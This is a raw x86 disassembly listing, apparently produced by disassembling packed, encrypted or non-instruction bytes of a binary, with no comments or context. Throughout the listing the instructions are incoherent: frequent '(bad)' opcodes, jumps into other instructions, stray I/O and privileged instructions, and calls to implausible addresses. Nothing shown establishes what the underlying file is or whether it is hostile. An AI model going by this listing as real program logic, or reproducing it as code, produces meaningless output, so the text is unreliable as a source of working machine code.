  4064ce:	dec    DWORD PTR ds:0xd501e7f1
  4064d4:	mov    bh,bh
  4064d6:	push   0xffffff88
  4064d8:	arpl   WORD PTR [edx+0x51],di
  4064db:	dec    ecx
  4064dc:	or     eax,0x4c29b468
  4064e1:	(bad)  
  4064e2:	(bad)  
  4064e3:	jge    0x4064c2
  4064e5:	inc    edi
  4064e6:	inc    ecx
  4064e7:	mov    bl,ah
  4064e9:	add    eax,edx
  4064eb:	add    bh,al
  4064ed:	mov    BYTE PTR [eax-0x1],dl
  4064f0:	dec    ebp
  4064f1:	add    eax,0x88c5a0e8
  4064f6:	jmp    FWORD PTR [edx+0x48]
  4064f9:	arpl   WORD PTR [ebp+0x680d0951],ax
  4064ff:	mov    ah,0x29
  406501:	dec    esp
  406502:	(bad)  
  406503:	(bad)  
  406504:	jge    0x4064e3
  406506:	inc    edi
  406507:	inc    ecx
  406508:	dec    eax
  406509:	jecxz  0x4064ec
  40650b:	iret   
  40650c:	(bad)  
  40650d:	mov    BYTE PTR [ebx],cl
  40650f:	ror    BYTE PTR [ecx+edx*1],0x89
  406513:	inc    ebp
  406514:	jl     0x40649f
  406516:	jne    0x40650c
  406518:	xor    edi,ebx
  40651a:	cmc    
  40651b:	pop    es
  40651c:	or     DWORD PTR [ecx+0x7e],eax
  40651f:	dec    DWORD PTR [esi]
  406521:	shl    ch,1
  406523:	repz sbb ecx,esi
  406526:	dec    esi
  406527:	(bad)  
  406528:	dec    BYTE PTR [edx+0x3]
  40652b:	push   0xffc2917a
  406530:	push   esi
  406531:	icebp  
  406532:	rol    DWORD PTR [eax+0x31],1
  406535:	cwde   
  406536:	add    eax,0x6ae03100
  40653b:	mov    dl,0xe6
  40653d:	pop    es
  40653e:	adc    BYTE PTR [eax-0x32],0xf5
  406542:	or     ch,al
  406544:	popa   
  406545:	jne    0x4065c6
  406547:	dec    DWORD PTR [ebx+0x60]
  40654a:	jmp    0x4064d1
  40654c:	pusha  
  40654d:	mov    eax,ds:0xc0006803
  406552:	xor    ebp,eax
  406554:	dec    DWORD PTR [esi]
  406556:	bound  eax,QWORD PTR [ebx]
  406558:	add    BYTE PTR [ecx-0x69306cb8],dh
  40655e:	inc    edi
  40655f:	or     eax,eax
  406561:	add    eax,0x7d458c56
  406566:	mov    bh,0xf9
  406568:	repz jle 0x4065a0
  40656b:	or     al,0xe8
  40656d:	and    BYTE PTR [ebp+0x156eff7f],ah
  406573:	js     0x40655d
  406575:	shl    BYTE PTR [ebx+0x5fcbff7f],1
  40657b:	jmp    0x4065f7
  40657d:	add    BYTE PTR [ecx],ah
  40657f:	add    al,0x68
  406581:	test   DWORD PTR [ecx],edx
  406583:	(bad)  
  406586:	popa   
  406587:	add    eax,DWORD PTR [eax]
  406589:	mov    cl,0x88
  40658b:	jecxz  0x40655b
  40658d:	ss out 0xd3,eax
  406590:	(bad)  
  406591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406592:	or     ecx,esi
  406594:	imul   esi,DWORD PTR [eax],0x74
  406597:	pop    esi
  406598:	jg     0x406525
  40659a:	or     ecx,eax
  40659c:	test   DWORD PTR [eax-0x3d141738],eax
  4065a2:	xlat   BYTE PTR ds:[ebx]
  4065a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065a4:	add    ebx,DWORD PTR [ecx-0x4efc16f5]
  4065aa:	pusha  
  4065ab:	lods   eax,DWORD PTR ds:[esi]
  4065ac:	dec    esi
  4065ad:	div    BYTE PTR [ebp-0x1e]
  4065b0:	inc    ebx
  4065b1:	gs pop ds
  4065b3:	jo     0x40657e
  4065b5:	add    dl,ah
  4065b7:	jne    0x40654d
  4065b9:	ja     0x406599
  4065bb:	sti    
  4065bc:	loopne 0x406629
  4065be:	repz je 0x4065cf
  4065c1:	jg     0x406591
  4065c3:	sti    
  4065c4:	cld    
  4065c5:	imul   esp,DWORD PTR [ebx],0x45
  4065c8:	(bad)  
  4065c9:	jle    0x406589
  4065cb:	sti    
  4065cc:	hlt    
  4065cd:	jle    0x40660b
  4065cf:	add    DWORD PTR [ecx],eax
  4065d1:	mov    DWORD PTR [eax+0x75],edi
  4065d4:	out    0x4c,al
  4065d6:	jae    0x4065e4
  4065d8:	jmp    0x41a511b5
  4065dd:	add    al,0x31
  4065df:	data16 (bad) 
  4065e1:	jle    0x4065e7
  4065e3:	add    eax,0x612ef8c6
  4065e8:	mov    esp,0xa0757e74
  4065ed:	inc    ecx
  4065ee:	sub    DWORD PTR [ecx],ecx
  4065f0:	adc    al,0x8b
  4065f2:	pop    ebp
  4065f3:	xchg   DWORD PTR [ebp-0x618a9849],ebp
  4065f9:	inc    esi
  4065fa:	mov    ah,0xb0
  4065fc:	xchg   edi,eax
  4065fd:	jle    0x406655
  4065ff:	or     cl,ch
  406601:	add    esi,DWORD PTR [ecx]
  406603:	sub    BYTE PTR [eax+edx*1],0x3a
  406607:	dec    ecx
  406608:	cmc    
  406609:	or     BYTE PTR [ecx+0x39e90030],dh
  40660f:	or     al,0xe9
  406611:	adc    BYTE PTR [ecx+ecx*1],dh
  406614:	add    BYTE PTR [esi+0x29],ah
  406617:	add    eax,ebp
  406619:	stc    
  40661a:	add    BYTE PTR [edi+0x72e2ff74],al
  406620:	dec    BYTE PTR [esi]
  406622:	rol    DWORD PTR [eax-0x7816bf3c],0xfe
  406629:	or     edx,DWORD PTR [ecx-0x14]
  40662c:	inc    ebx
  40662d:	push   DWORD PTR [esi]
  40662f:	mov    eax,DWORD PTR [esi]
  406631:	push   0xffc9ff36
  406636:	and    eax,0xdee800e9
  40663b:	outs   dx,DWORD PTR ds:[esi]
  40663c:	je     0x40663d
  40663e:	pusha  
  40663f:	test   eax,0x4f0efeb1
  406644:	loope  0x406683
  406646:	call   0x64cd6f7d
  40664b:	jo     0x4066c0
  40664d:	push   esi
  40664f:	jecxz  0x4066bd
  406651:	mov    bh,0x22
  406653:	das    
  406654:	je     0x4065e3
  406656:	ins    BYTE PTR es:[edi],dx
  406657:	repz jb 0x406659
  40665a:	fiadd  WORD PTR [ebp+0x1791b573]
  406660:	je     0x406661
  406662:	rcr    DWORD PTR [edx],0xbb
  406665:	add    cl,ch
  406667:	mov    ebx,0xfcbfbc8e
  40666c:	jae    0x4066ae
  40666e:	out    0xae,al
  406670:	jo     0x406672
  406672:	jmp    0xabd5eca9
  406677:	out    0x73,eax
  406679:	call   DWORD PTR [esi-0x16ffe6cd]
  40667f:	add    BYTE PTR [edx],dh
  406681:	std    
  406682:	fs pop esp
  406684:	jae    0x4066a6
  406686:	push   eax
  406687:	add    BYTE PTR [eax],ah
  406689:	in     al,0x4e
  40668b:	inc    ecx
  40668c:	dec    eax
  40668d:	loopne 0x406654
  40668f:	mov    dh,0x48
  406691:	or     BYTE PTR [ebx],cl
  406693:	shl    BYTE PTR ds:0x18b1e90b,0x8
  40669a:	add    BYTE PTR [ebp-0x2385b],cl
  4066a0:	jg     0x406626
  4066a2:	inc    edx
  4066a3:	sub    al,0xc8
  4066a5:	pop    edi
  4066a6:	out    dx,al
  4066a7:	dec    edi
  4066a8:	fld    DWORD PTR [edi]
  4066aa:	call   0x4ded58
  4066af:	or     ecx,DWORD PTR [eax+0x7c]
  4066b2:	add    al,0xe9
  4066b4:	test   BYTE PTR ds:0xa5c00000,cl
  4066ba:	dec    eax
  4066bb:	inc    ecx
  4066bc:	enter  0x74f4,0xc
  4066c0:	xor    BYTE PTR [edi-0x7bc00032],ch
  4066c6:	xchg   ebp,eax
  4066c7:	ret    0xf62e
  4066ca:	dec    BYTE PTR [ebp+0x5052239a]
  4066d0:	xor    bl,dh
  4066d2:	int    0xff
  4066d4:	lahf   
  4066d5:	push   edi
  4066d6:	(bad)  
  4066d7:	jne    0x406681
  4066d9:	push   edi
  4066da:	(bad)  
  4066db:	jne    0x40667d
  4066dd:	fist   WORD PTR [ecx]
  4066df:	(bad)  
  4066e0:	jg     0x4066d6
  4066e2:	out    0xf9,eax
  4066e4:	add    dl,dl
  4066e6:	hlt    
  4066e7:	(bad)  
  4066e8:	jmp    0x4066e5
  4066ea:	add    DWORD PTR [edx+0x2c],0x1
  4066ee:	mov    esi,DWORD PTR [esi+edi*8+0x67f4bf]
  4066f5:	dec    edx
  4066f6:	dec    eax
  4066f7:	(bad)  
  4066f8:	inc    BYTE PTR ds:0xbffffebc
  4066fe:	fist   WORD PTR [ecx-0x49]
  406701:	xor    DWORD PTR [edx+0x3],esp
  406704:	or     esi,DWORD PTR [ecx+0x1d]
  406707:	(bad)  
  406708:	addr16 xchg edi,eax
  40670a:	cmp    ebx,eax
  40670c:	(bad)  
  40670d:	aas    
  40670e:	jl     0x40671f
  406710:	call   0xffbd12da
  406715:	cs ds mov bh,0xfe
  406719:	es in  al,dx
  40671b:	shl    bh,cl
  40671d:	in     eax,0x22
  40671f:	jl     0x406720
  406721:	xor    DWORD PTR [eax+0x60217d80],0x2b990cf7
  40672b:	rol    BYTE PTR [eax+0x31],cl
  40672e:	nop
  40672f:	imul   esp,DWORD PTR [edx],0xffffffbe
  406732:	pusha  
  406733:	add    ebp,ebx
  406735:	xor    al,0xf8
  406737:	add    DWORD PTR [eax],eax
  406739:	xor    DWORD PTR [eax-0x27],esp
  40673c:	or     dh,cl
  40673e:	pushf  
  40673f:	or     dl,BYTE PTR [edx-0x2a]
  406742:	xchg   ebp,eax
  406743:	or     ebp,eax
  406745:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406746:	add    bh,BYTE PTR [edi+edi*8+0x0]
  40674a:	(bad)  
  40674c:	dec    eax
  40674d:	(bad)  
  40674e:	mov    esi,0xb7c285e5
  406753:	jnp    0x4067d0
  406755:	push   eax
  406756:	scas   al,BYTE PTR es:[edi]
  406757:	cmp    eax,0x6ba6febf
  40675c:	ins    BYTE PTR es:[edi],dx
  40675d:	add    bh,ah
  40675f:	pusha  
  406760:	add    eax,DWORD PTR [ebp+0x10806b71]
  406766:	mov    es,WORD PTR [ebx+0x7b]
  406769:	(bad)  
  40676a:	mov    esp,0x7eff7a8c
  40676f:	pop    eax
  406770:	ja     0x406727
  406772:	xor    DWORD PTR [eax+0x7a],esp
  406775:	mov    ch,0xa9
  406777:	mov    ds:0x959ff7b,al
  40677c:	or     eax,0xb0725e4e
  406781:	inc    esi
  406782:	and    eax,0x5d8f3c09
  406787:	xchg   BYTE PTR [ebp-0x7b339188],ah
  40678d:	add    al,0x31
  40678f:	or     ecx,ebp
  406791:	jp     0x40674f
  406793:	add    al,0x81
  406795:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406796:	push   DWORD PTR [ecx+0x6e]
  406799:	psllw  mm7,mm4
  40679c:	add    cl,BYTE PTR [ebp-0xea18a8c]
  4067a2:	es jb  0x406781
  4067a5:	ja     0x4067c0
  4067a7:	push   ecx
  4067a8:	sbb    al,0x7b
  4067aa:	push   es
  4067ab:	fld    DWORD PTR [ebp-0xf]
  4067ae:	add    dl,bh
  4067b0:	pusha  
  4067b1:	stc    
  4067b2:	dec    ebp
  4067b3:	div    BYTE PTR [ecx+0x66]
  4067b6:	shr    edx,0xde
  4067b9:	out    0x7a,eax
  4067bb:	pop    esp
  4067bc:	jne    0x4067e4
  4067be:	icebp  
  4067bf:	ss popa 
  4067c1:	aad    0x79
  4067c3:	(bad)  
  4067c4:	jno    0x4067dc
  4067c6:	icebp  
  4067c7:	retf   0xf160
  4067ca:	dec    ebp
  4067cb:	(bad)  
  4067cc:	jno    0x4067fe
  4067ce:	inc    esi
  4067cf:	sub    eax,0xc58e9409
  4067d4:	xchg   DWORD PTR ds:0xee71af74,ebp
  4067da:	in     eax,dx
  4067db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067dc:	fucomip st,st(1)
  4067de:	jp     0x406804
  4067e0:	add    ecx,edx
  4067e2:	xor    ch,BYTE PTR [esi+0x71]
  4067e5:	(bad)  
  4067e6:	mov    esp,?
  4067e8:	je     0x40682b
  4067ea:	add    BYTE PTR [eax],dh
  4067ec:	or     ecx,ebp
  4067ee:	mov    BYTE PTR [ecx+edi*2-0x27898541],dh
  4067f5:	inc    eax
  4067f7:	mov    ecx,0x37e900bb
  4067fc:	dec    ecx
  4067fd:	(bad)  
  4067ff:	xchg   edi,eax
  406800:	or     BYTE PTR [eax],al
  406802:	jmp    0xe9417520
  406807:	xor    al,BYTE PTR [edx]
  406809:	xchg   DWORD PTR [ecx+0x32],esi
  40680c:	or     DWORD PTR [eax],eax
  40680e:	adc    edx,eax
  406810:	xlat   BYTE PTR ds:[ebx]
  406811:	inc    eax
  406812:	jmp    0xf7cc1117
  406817:	ja     0x4067c4
  406819:	jo     0x40686b
  40681b:	adc    DWORD PTR [eax],0xad66ff3e
  406821:	xchg   al,dh
  406823:	pop    edi
  406824:	fwait
  406825:	jo     0x406826
  406827:	pushf  
  406828:	sub    BYTE PTR [edi-0x1],0x4e
  40682c:	sbb    cl,BYTE PTR ds:0x7e32e901
  406832:	test   DWORD PTR [esi],esi
  406834:	js     0x4068a6
  406836:	call   FWORD PTR [ecx-0x57b75f26]
  40683c:	xor    ah,cl
  40683e:	or     edi,DWORD PTR [ebx-0x1b988f0b]
  406844:	cld    
  406845:	leave  
  406846:	inc    DWORD PTR [eax]
  406848:	div    DWORD PTR [ebp+0x4937e900]
  40684e:	je     0x406828
  406850:	int3   
  406851:	jo     0x4067df
  406853:	fs inc ebx
  406855:	outs   dx,DWORD PTR ds:[esi]
  406856:	push   esi
  406858:	sub    DWORD PTR [edi+0x75],0xffffffe1
  40685c:	sbb    dl,BYTE PTR [ebx+0x7018e6fd]
  406862:	mov    ch,0xd9
  406864:	sbb    esi,DWORD PTR [eax-0x1]
  406867:	inc    ecx
  406868:	xor    DWORD PTR [edx],ecx
  40686a:	add    cl,ch
  40686c:	scas   eax,DWORD PTR es:[edi]
  40686d:	xchg   bh,dh
  40686f:	add    BYTE PTR [esi-0xe],dh
  406872:	(bad)  
  406873:	push   eax
  406874:	loopne 0x40682a
  406876:	dec    eax
  406877:	inc    ecx
  406878:	add    BYTE PTR [eax+0x64],bl
  40687b:	rsqrtps xmm3,XMMWORD PTR [ecx]
  40687e:	add    eax,0x4c1a0568
  406883:	jmp    edi
  406885:	pusha  
  406886:	lahf   
  406887:	add    BYTE PTR [eax],al
  406889:	push   ebx
  40688a:	int3   
  40688b:	jae    0x40689e
  40688d:	xor    al,BYTE PTR ds:0xf2bf858d
  406893:	(bad)  
  406894:	call   FWORD PTR [eax]
  406896:	bnd je 0x4068a1
  406899:	mov    al,0x51
  40689b:	cld    
  40689c:	call   DWORD PTR [edi-0x690f4b0e]
  4068a2:	repnz (bad) 
  4068a4:	call   0x3f2b71
  4068a9:	repnz sbb al,0xe8
  4068ac:	xchg   ecx,eax
  4068ad:	and    eax,0x480bfef2
  4068b2:	jns    0x4068cf
  4068b4:	push   0x405c6e
  4068b9:	enter  0x1ce3,0xcd
  4068bd:	pop    ss
  4068be:	repnz dec edi
  4068c0:	push   0xffffffc8
  4068c2:	pop    ebx
  4068c3:	(bad)  
  4068c4:	jne    0x4068a6
  4068c6:	jecxz  0x4068f9
  4068c8:	std    
  4068c9:	daa    
  4068ca:	repnz out 0x19,eax
  4068cd:	adc    edx,esi
  4068cf:	(bad)  
  4068d0:	push   0x405c1d
  4068d5:	mov    ds:0x9075ff0d,al
  4068da:	jecxz  0x406885
  4068dc:	inc    BYTE PTR [eax]
  4068de:	xchg   edi,eax
  4068df:	lock addr16 aad 0x59
  4068e3:	dec    esp
  4068e4:	jmp    FWORD PTR [ecx+0x2b]
  4068e7:	bnd je 0x4068f2
  4068ea:	xor    DWORD PTR [edx-0x64],ecx
  4068ed:	inc    BYTE PTR [esi-0x1f2b14c2]
  4068f3:	and    BYTE PTR [edx+ebp*2],al
  4068f6:	adc    eax,0x5907eeaf
  4068fb:	in     eax,0x78
  4068fd:	jmp    DWORD PTR [esi-0x62]
  406900:	out    dx,al
  406901:	sti    
  406902:	pop    esi
  406903:	or     al,0xc
  406905:	call   0xffb91100
  40690a:	js     0x4068af
  40690c:	(bad)  
  40690d:	(bad)  
  40690e:	fucomp st(2)
  406910:	pushw  0x6231
  406914:	push   0x77436be
  406919:	jmp    DWORD PTR [eax+ebp*2-0x1fe82895]
  406920:	ja     0x4068eb
  406922:	repz js 0x406928
  406925:	push   ebp
  406926:	stos   BYTE PTR es:[edi],al
  406927:	mov    esp,0x2009c483
  40692c:	mov    esi,0x36031fb
  406931:	add    BYTE PTR [ebp+ebx*4+0x4f895077],ch
  406938:	aad    0x40
  40693a:	xor    DWORD PTR [edi],esi
  40693c:	out    dx,al
  40693d:	or     esp,esi
  40693f:	jne    0x406996
  406941:	dec    eax
  406942:	add    BYTE PTR [eax+0x60],dh
  406945:	imul   edi,DWORD PTR [edx+0xb780fea],0xfffffff1
  40694c:	mov    WORD PTR [ecx],ds
  40694e:	mov    DWORD PTR [eax+ebx*1-0x15],ebp
  406952:	add    BYTE PTR [ecx],dh
  406954:	pop    ss
  406955:	mov    ecx,0x776c3cff
  40695a:	jne    0x406905
  40695c:	ja     0x40694b
  40695e:	pop    es
  40695f:	cdq    
  406960:	mov    al,ds:0x99eff69
  406965:	out    0xf1,al
  406967:	sahf   
  406968:	popa   
  406969:	imul   ecx,DWORD PTR [esi+ecx*4+0x6e],0x93942a0
  406971:	xor    al,0x8b
  406973:	lea    ecx,[eax+0x6e77b0ad]
  406979:	mov    esi,0xb7b1b43f
  40697e:	ja     0x4069e6
  406980:	or     ecx,ebp
  406982:	add    esi,DWORD PTR [ecx]
  406984:	sub    BYTE PTR [eax+ecx*1],0x2a
  406988:	dec    ecx
  406989:	adc    eax,0xe931b101
  40698e:	lock sub eax,0x3104e560
  406994:	or     DWORD PTR [esi-0xb91d90f],eax
  40699a:	pop    es
  40699b:	sbb    DWORD PTR [ebp-0x5e],ebx
  40699e:	ja     0x4069c6
  4069a0:	fstp   DWORD PTR [eax]
  4069a2:	ja     0x406948
  4069a4:	add    DWORD PTR [ecx-0x22],edx
  4069a7:	add    BYTE PTR [edi],dl
  4069a9:	outs   dx,BYTE PTR ds:[esi]
  4069aa:	pop    esi
  4069ab:	ins    BYTE PTR es:[edi],dx
  4069ac:	dec    edi
  4069ad:	inc    ecx
  4069ae:	push   esi
  4069af:	ja     0x40694a
  4069b1:	jnp    0x406951
  4069b3:	(bad)  
  4069b4:	(bad)  
  4069b5:	outs   dx,BYTE PTR ds:[esi]
  4069b6:	mov    esp,0x32590907
  4069bb:	ja     0x4069ab
  4069bd:	jg     0x406a2b
  4069bf:	mov    esp,0xec2e6de7
  4069c4:	sbb    al,0x8
  4069c6:	jmp    0x2bc40dce
  4069cb:	jbe    0x40699b
  4069cd:	ins    DWORD PTR es:[edi],dx
  4069ce:	mov    ecx,0xe41796b
  4069d3:	ja     0x406981
  4069d5:	sub    DWORD PTR [ebx],0x76
  4069d8:	mov    dh,0x6d
  4069da:	cdq    
  4069db:	jbe    0x4069c1
  4069dd:	mov    al,0x0
  4069df:	neg    DWORD PTR [edi]
  4069e1:	outs   dx,BYTE PTR ds:[esi]
  4069e2:	call   0x494d5a
  4069e7:	jo     0x40699a
  4069e9:	lods   al,BYTE PTR ds:[esi]
  4069ea:	(bad)  
  4069eb:	fiadd  WORD PTR [edi]
  4069ed:	leave  
  4069ee:	push   cs
  4069ef:	ins    DWORD PTR es:[edi],dx
  4069f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069f1:	or     BYTE PTR [eax],al
  4069f3:	jmp    0xc802fda1
  4069f8:	jmp    FWORD PTR [ebp-0x9]
  4069fb:	jmp    0x406a3f
  4069fd:	or     DWORD PTR [eax],eax
  4069ff:	jmp    0x54cd635a
  406a04:	lock outs dx,BYTE PTR ds:[esi]
  406a06:	jmp    DWORD PTR [esi+0x392bcaa9]
  406a0c:	add    BYTE PTR [ebp+0x5c],bl
  406a0f:	dec    edi
  406a10:	sub    BYTE PTR ds:0x325a5161,ch
  406a16:	or     DWORD PTR [ebx],ecx
  406a18:	test   eax,0x23eb0741
  406a1d:	mov    eax,0x9f77c296
  406a22:	ins    BYTE PTR es:[edi],dx
  406a23:	lea    ebp,[ebx]
  406a25:	dec    ecx
  406a26:	fldenv [edi+0x56]
  406a29:	out    dx,eax
  406a2a:	leave  
  406a2b:	call   DWORD PTR [eax+0x5f]
  406a2e:	mov    eax,0x493be900
  406a33:	jne    0x406a20
  406a35:	mov    ecx,ecx
  406a37:	mov    WORD PTR [eax+esi*2+0x6b],ds
  406a3b:	(bad)  
  406a3c:	ds mov ecx,0xb1602bc7
  406a42:	mov    ch,0xfe
  406a44:	cs addr16 loope 0x4069f5
  406a48:	mov    cl,0xed
  406a4a:	ins    BYTE PTR es:[edi],dx
  406a4b:	(bad)  
  406a4c:	xchg   esp,eax
  406a4d:	ss popa 
  406a4f:	cmp    al,0x22
  406a51:	aas    
  406a52:	ins    BYTE PTR es:[edi],dx
  406a53:	call   DWORD PTR [esi+ecx*4+0x6b]
  406a57:	inc    DWORD PTR [eax]
  406a59:	das    
  406a5a:	pop    eax
  406a5b:	out    0x84,eax
  406a5d:	arpl   bx,si
  406a5f:	(bad)  
  406a60:	jmp    DWORD PTR ds:0x23e85018
  406a66:	mov    edi,0x5558fffe
  406a6b:	(bad)  
  406a6c:	jne    0x4069ee
  406a6e:	loopne 0x406a10
  406a70:	inc    BYTE PTR [eax]
  406a72:	pop    edi
  406a73:	mul    bh
  406a75:	jns    0x406a4e
  406a77:	idiv   dh
  406a79:	lea    eax,ds:0xaffffdc7
  406a7f:	push   ebp
  406a80:	(bad)  
  406a81:	mov    ch,0xdc
  406a83:	repnz (bad) 
  406a85:	push   DWORD PTR [eax-0x34]
  406a88:	mov    cl,0x0
  406a8a:	dec    eax
  406a8b:	jmp    0x406a4c
  406a8d:	pmullw mm5,QWORD PTR [eax-0x2]
  406a91:	call   FWORD PTR [edi-0x51434b0a]
  406a97:	idiv   dh
  406a99:	call   0x41222e
  406a9e:	scas   eax,DWORD PTR es:[edi]
  406a9f:	pushf  
  406aa0:	mov    eax,0xe7f69ffe
  406aa5:	dec    ecx
  406aa6:	xlat   BYTE PTR ds:[ebx]
  406aa7:	cmc    
  406aa8:	dec    cl
  406aaa:	dec    edx
  406aab:	add    DWORD PTR [eax],eax
  406aad:	push   ebp
  406aae:	and    ecx,0xffffff82
  406ab1:	les    ebx,FWORD PTR [esi+esi*8+0x74]
  406ab5:	or     al,0x70
  406ab7:	xchg   bl,cl
  406ab9:	jmp    FWORD PTR [edi-0x80]
  406abc:	inc    ebp
  406abd:	cld    
  406abe:	jecxz  0x406a87
  406ac0:	push   cs
  406ac1:	test   BYTE PTR [ebp+eax*1+0x0],cl
  406ac5:	add    al,dh
  406ac7:	cmp    dl,BYTE PTR [edx+0x41]
  406aca:	enter  0x74f4,0xfc
  406ace:	and    BYTE PTR [ebx+0x1331ffca],dh
  406ad4:	aam    0x67
  406ad6:	add    BYTE PTR [edi+0x66ffc2ae],dl
  406adc:	add    ebp,edi
  406ade:	pop    es
  406adf:	cdq    
  406ae0:	aad    0x75
  406ae2:	jmp    DWORD PTR [esi-0x6138f6f7]
  406ae8:	pop    edx
  406ae9:	jmp    0x406b54
  406aeb:	add    ah,BYTE PTR [ecx]
  406aed:	add    al,0xff
  406aef:	add    al,0x4e
  406af1:	imul   ebx,DWORD PTR [ebp+0x5074527b],0x9
  406af8:	test   al,dl
  406afa:	inc    eax
  406afb:	xor    DWORD PTR [edx],edx
  406afd:	jne    0x406b74
  406aff:	cmp    DWORD PTR [edx-0x10],ebx
  406b02:	std    
  406b03:	data16 mov dl,0x6b
  406b06:	jmp    0x2eb2:0x68749a77
  406b0d:	ret    
  406b0e:	dec    DWORD PTR [edi+0x14]
  406b11:	js     0x406afb
  406b13:	lds    esp,FWORD PTR [edi+0x9e1ff74]
  406b19:	sahf   
  406b1a:	push   ebx
  406b1b:	lock popa 
  406b1d:	sar    esi,cl
  406b1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b20:	js     0x406b8d
  406b22:	push   edx
  406b23:	daa    
  406b24:	hlt    
  406b25:	jae    0x406b0f
  406b27:	call   0x8a3fdfce
  406b2c:	test   eax,edx
  406b2e:	inc    eax
  406b2f:	xor    ebx,ecx
  406b31:	in     eax,dx
  406b32:	sti    
  406b33:	sbb    DWORD PTR [eax-0x4f0100b7],edi
  406b39:	jmp    0x406ae0
  406b3b:	add    BYTE PTR [edx-0x5f],ah
  406b3e:	add    edx,DWORD PTR [eax-0x12]
  406b41:	mov    ch,0xb
  406b43:	call   0xffb49d68
  406b48:	leave  
  406b49:	mov    BYTE PTR ds:0x2609d6ff,bh
  406b4f:	out    dx,al
  406b50:	retf   0x4961
  406b53:	cmp    eax,0x41206ac6
  406b58:	sub    DWORD PTR [ecx],ecx
  406b5a:	mov    ah,0x88
  406b5c:	lds    eax,FWORD PTR [esi-0x20f988d3]
  406b62:	call   0x7caa9e50
  406b67:	or     ecx,DWORD PTR [ecx-0x698bd5b8]
  406b6d:	sub    BYTE PTR [eax+esi*2],0xba
  406b71:	sub    al,0x37
  406b73:	mov    esp,0x336908f1
  406b78:	xor    ebp,esi
  406b7a:	adc    esp,ebx
  406b7c:	pop    ds
  406b7d:	xlat   BYTE PTR ds:[ebx]
  406b7e:	daa    
  406b7f:	add    al,0x6
  406b81:	popa   
  406b82:	lds    esi,FWORD PTR [esi+0x43e20931]
  406b88:	in     eax,0xa
  406b8a:	push   ss
  406b8b:	pop    esp
  406b8c:	sbb    DWORD PTR [ecx-0x5a],ebx
  406b8f:	jae    0x406bcb
  406b91:	dec    ecx
  406b92:	adc    eax,0x4ee0e118
  406b97:	xlat   BYTE PTR ds:[ebx]
  406b98:	icebp  
  406b99:	or     BYTE PTR [ecx],bh
  406b9b:	jae    0x406b59
  406b9d:	add    BYTE PTR [ecx+0x6a2c005b],dl
  406ba3:	jle    0x406c01
  406ba5:	ja     0x406bea
  406ba7:	jbe    0x406c1c
  406ba9:	sbb    eax,0x16ada936
  406bae:	push   0x66
  406bb0:	jae    0x406bb5
  406bb2:	fwait
  406bb3:	and    DWORD PTR [ebx],ecx
  406bb5:	jl     0x406bfb
  406bb7:	ret    
  406bb8:	or     eax,0x5be0f3fe
  406bbd:	add    BYTE PTR [ebx+0x46],ch
  406bc0:	jae    0x406c1d
  406bc2:	es ds stc 
  406bc5:	cs popa 
  406bc7:	add    BYTE PTR [esi+0x63],cl
  406bca:	push   0xffffffff
  406bcc:	ret    
  406bcd:	es push 0x75
  406bd0:	icebp  
  406bd1:	push   0x4c
  406bd3:	(bad)  
  406bd4:	push   ds
  406bd5:	inc    edx
  406bd6:	fbld   TBYTE PTR ds:0xe801b816
  406bdc:	cmp    al,BYTE PTR [ebx+0x6a]
  406bdf:	call   DWORD PTR [ecx-0x16bf28b3]
  406be5:	and    esi,esp
  406be7:	pop    es
  406be8:	add    DWORD PTR [eax+0x6c],ebp
  406beb:	(bad)  
  406bec:	out    dx,al
  406bed:	jp     0x406bc1
  406bef:	push   ecx
  406bf0:	sub    BYTE PTR ds:0xeaf1756a,dh
  406bf6:	xor    ch,bh
  406bf8:	(bad)  
  406bf9:	add    esp,ecx
  406bfb:	mov    WORD PTR [ebx],?
  406bfd:	ins    BYTE PTR es:[edi],dx
  406bfe:	imul   edi,esi,0x2b616d3c
  406c04:	mov    esp,0x6869e300
  406c09:	jb     0x406b8f
  406c0b:	enter  0xadff,0x59
  406c0f:	add    eax,ebp
  406c11:	pop    es
  406c12:	shr    BYTE PTR [ecx-0x1],0x11
  406c16:	mov    esp,0xc3e940d6
  406c1b:	repz pop es
  406c1d:	sbb    DWORD PTR ds:0xa86ff6c,0x2d285308
  406c27:	push   0xd7ae175
  406c2c:	std    
  406c2d:	outs   dx,BYTE PTR ds:[esi]
  406c2e:	mov    ds:0x83657568,eax
  406c33:	fiadd  WORD PTR [edi]
  406c35:	push   ecx
  406c36:	inc    ecx
  406c37:	dec    esp
  406c38:	call   DWORD PTR [esi-0x1d]
  406c3b:	push   ecx
  406c3c:	ret    0x32e5
  406c3f:	mov    esi,0x8f84008a
  406c44:	jge    0x406c52
  406c46:	fsub   DWORD PTR [eax+0x15]
  406c49:	call   FWORD PTR [ebp-0xb8a0104]
  406c4f:	(bad)  [eax+ecx*1+0x20]
  406c53:	pushf  
  406c54:	jmp    0x406c55
  406c56:	daa    
  406c57:	(bad)  [esp+ecx*1+0x30]
  406c5b:	xchg   edi,eax
  406c5c:	(bad)  
  406c5f:	and    eax,0x41980cc2
  406c64:	mov    ch,ah
  406c66:	sbb    edx,eax
  406c68:	sti    
  406c69:	push   0x0
  406c6b:	mov    bl,bl
  406c6d:	je     0x406c83
  406c6f:	xchg   DWORD PTR [eax+0xf],esp
  406c72:	(bad)  
  406c73:	in     eax,dx
  406c74:	or     al,ch
  406c76:	cdq    
  406c77:	rcr    dl,0xfe
  406c7a:	or     ecx,eax
  406c7c:	popa   
  406c7d:	pop    ebx
  406c7e:	mov    DWORD PTR [ebp-0x27],ecx
  406c81:	addr16 pop ss
  406c83:	dec    esp
  406c84:	dec    esp
  406c85:	(bad)  
  406c86:	(bad)  
  406c87:	sbb    eax,0x910ce7d9
  406c8c:	(bad)  
  406c8e:	push   0xbeef0c48
  406c93:	or     dl,bl
  406c95:	je     0x406c9f
  406c97:	mov    al,ds:0xa7ffffb0
  406c9c:	inc    ebp
  406c9d:	and    DWORD PTR [ecx+ecx*1+0xd],edx
  406ca1:	push   DWORD PTR [ebp-0x4c]
  406ca4:	(bad)  
  406ca5:	lock enter 0xdaa7,0x67
  406caa:	add    DWORD PTR [eax],ecx
  406cac:	jmp    0x60c7bd6e
  406cb1:	pop    es
  406cb2:	call   0x3f4739
